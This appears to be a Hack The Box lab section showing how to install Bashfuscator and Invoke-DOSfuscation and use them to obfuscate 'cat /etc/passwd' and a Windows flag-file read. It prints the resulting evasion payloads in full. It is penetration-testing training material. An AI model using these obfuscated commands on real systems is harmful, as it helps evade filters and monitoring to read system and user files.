## Linux (Bashfuscator)

```shell
3kjS@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator 
3kjS@htb[/htb]$ cd Bashfuscator 
3kjS@htb[/htb]$ pip3 install setuptools==65 
3kjS@htb[/htb]$ python3 setup.py install --user
```

```shell
3kjS@htb[/htb]$ cd ./bashfuscator/bin/ 
3kjS@htb[/htb]$ ./bashfuscator -h
```

We can start by simply providing the command we want to obfuscate with the `-c` flag:

```shell
3kjS@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' 

[+] Mutators used: Token/ForCode -> Command/Reverse 
[+] Payload: ${*/+27\[X\(} ...SNIP... ${*~} 
[+] Payload size: 1664 characters
```

```shell
3kjS@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

```shell
3kjS@htb[/htb]$ bash -c 'eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```
## Windows (DOSfuscation)

```powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git 
PS C:\htb> cd Invoke-DOSfuscation 
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1 
PS C:\htb> Invoke-DOSfuscation Invoke-DOSfuscation> help
```

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt 
Invoke-DOSfuscation> encoding 
Invoke-DOSfuscation\Encoding> 1
```

```cmd
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt 

test_flag
```
